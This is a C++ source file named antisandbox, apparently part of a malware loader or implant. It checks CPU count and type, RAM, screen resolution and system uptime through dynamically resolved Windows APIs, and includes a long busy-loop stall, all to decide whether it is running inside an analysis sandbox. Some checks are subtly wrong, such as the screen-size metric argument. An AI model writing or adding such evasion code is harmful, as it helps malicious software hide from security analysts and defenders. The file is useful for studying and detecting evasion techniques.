#include "antisandbox.h"


bool checkProcessors(PAPI api) {
	SYSTEM_INFO sysInfo = { 0 };
	using grabSysInfo = void(*__stdcall)(LPSYSTEM_INFO);
	grabSysInfo getSysInfo = reinterpret_cast<grabSysInfo>(api->GetSystemInfo);
	getSysInfo(&sysInfo);
	if ((int)sysInfo.dwNumberOfProcessors < 4) {
		return true;
	}

	if ((int)sysInfo.dwProcessorType != 8664) {
		return true;
	}
	return false;
}


// return true if memory in Gb is less than numGigs
bool checkMemory(PAPI api, int numGigs) {
	DWORD minRAM = numGigs;
	MEMORYSTATUSEX stat;
	stat.dwLength = sizeof(stat);
	using getMemory = bool(*__stdcall)(LPMEMORYSTATUSEX);
	getMemory enumMem = reinterpret_cast<getMemory>(api->GlobalMemoryStatusEx);
	enumMem(&stat);
	DWORD numFound = (stat.ullTotalPhys / (1024 * 1024 * 1024));
	return ( numFound < minRAM) ? 1 : 0;
}



// paramter multiplier will chang based on processor speed
__declspec(noinline) int doSomeSleeps(int numSecondstimes2Point3) {
	BYTE* a{0};
	for (int i = 0; i < 2000000000; i++) {
		for (int i = 0; i < 2000000000; i++) {
			int j = i;
			DWORD b = j / 2;
			BYTE* a = (BYTE*)(b * 5000);
			for (int i = 0; i < numSecondstimes2Point3; i++) {
				a = a + 1;
				if (i == 1999999999) {
					return (int)a;
				}
			}
		}
	}
	
	return (int)a;
}


// return true if screen resolution is < 1920x1080
bool checkScreenResolution(PAPI api) {
	using getScreenSize = int(*__stdcall)(int);
	getScreenSize getSize = reinterpret_cast<getScreenSize>(api->GetSystemMetrics);
	int ret = getSize(SM_CXSCREEN / SM_CYSCREEN);
	if (ret < 1920) {
		return 1;
	}
	else {
		return 0;
	}
	
}

bool checkUpTime(PAPI api) {
	using tickCount = ULONGLONG(*__stdcall)();
	tickCount checkTickCount = reinterpret_cast<tickCount>(api->GetTickCount64);
	ULONGLONG uptime = checkTickCount() / 1000;
	if (uptime < 1200) return true;
	return false;
}


// return false if not a sandbox, return true if it is a sandbox
bool antiSandbox(PAPI api) {
	bool a = false, b = false, c = false, d = false;

	a = checkProcessors(api);
	b = checkMemory(api, 5);
	c = checkScreenResolution(api);
	d = checkUpTime(api);
	

	if (a || b || c || d) {
		return TRUE;
	}
	else {
		return FALSE;
	}

}